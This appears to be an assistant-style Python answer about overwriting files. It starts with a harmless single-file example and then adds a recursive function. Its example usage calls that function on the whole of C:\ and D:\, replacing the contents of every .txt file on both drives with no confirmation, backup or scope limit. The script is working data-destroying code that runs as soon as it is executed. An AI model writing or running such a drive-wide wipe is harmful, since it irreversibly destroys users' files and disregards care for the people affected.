# Function to overwrite a text file with new content
def overwrite_file(file_path, new_content):
    # Open the file in write mode to overwrite the content
    with open(file_path, 'w') as file:
        # Write the new content to the file
        file.write(new_content)
    print(f"File '{file_path}' has been overwritten.")

# Example usage
file_path = 'example.txt'
new_content = "This is the new content of the file."

overwrite_file(file_path, new_content)
You can use this function by providing the path to the text file you want to overwrite and the new content you want to write into it. The function opens the file in write mode ('w'), which automatically deletes the old contents and writes the new content.

import os

# Function to overwrite a text file with new content
def overwrite_file(file_path, new_content):
    try:
        # Open the file in write mode to overwrite the content
        with open(file_path, 'w') as file:
            # Write the new content to the file
            file.write(new_content)
        print(f"File '{file_path}' has been overwritten.")
    except Exception as e:
        print(f"Failed to overwrite file '{file_path}': {e}")

# Function to overwrite all text files in a folder and its subfolders
def overwrite_all_files_in_directory(directory_path, new_content):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if file.endswith('.txt'):
                file_path = os.path.join(root, file)
                overwrite_file(file_path, new_content)

# Example usage
new_content = "This is the new content of the file."

# Overwrite all text files on disk C
overwrite_all_files_in_directory('C:\\', new_content)

# Overwrite all text files on disk D
overwrite_all_files_in_directory('D:\\', new_content)
